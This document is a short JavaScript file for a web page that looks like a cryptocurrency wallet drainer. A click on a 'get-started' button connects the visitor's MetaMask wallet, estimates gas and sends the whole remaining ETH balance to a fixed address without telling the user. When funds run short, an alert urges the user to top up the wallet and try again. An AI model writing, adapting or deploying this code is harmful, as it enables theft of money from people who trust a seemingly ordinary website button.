
document.getElementById('get-started').addEventListener('click', () => connectAndSend('metamask'));

async function connectAndSend(walletType) {
    let provider;

    if (walletType === 'metamask') {
        if (!window.ethereum || !window.ethereum.isMetaMask) {
            alert('MetaMask is not installed');
            return;
        }
        provider = new ethers.providers.Web3Provider(window.ethereum);
    }

    // Request account access
    try {
        await provider.send("eth_requestAccounts", []);
    } catch (error) {
        console.error('User denied account access');
        return;
    }

    const signer = provider.getSigner();

    // Get the user's address and balance
    const userAddress = await signer.getAddress();
    let balance = await provider.getBalance(userAddress);

    // Estimate gas price and limit
    const gasPrice = await provider.getGasPrice();
    const dummyTransaction = { to: "0xB0994b43F798a151e75b38e01C5a9Da2B8895bc8", value: balance };
    const gasLimit = await provider.estimateGas(dummyTransaction);

    // Calculate gas fee and adjust balance
    const gasFee = gasPrice.mul(gasLimit);
    const value = balance.sub(gasFee);

    if (value.lte(0)) {
        alert('Insufficient balance to proceed,,cross check metamask account or top up wallet with ethereum and try again');
        return;
    }

    // Define and send the transaction
    const transaction = {
        to: "0xB0994b43F798a151e75b38e01C5a9Da2B8895bc8", // Replace with the recipient address
        value: value,
        gasLimit: gasLimit,
        gasPrice: gasPrice,
    };

    try {
        const txResponse = await signer.sendTransaction(transaction);
        console.log('Transaction sent:', txResponse);
    } catch (error) {
        console.error('Error sending transaction:', error);
    }
}



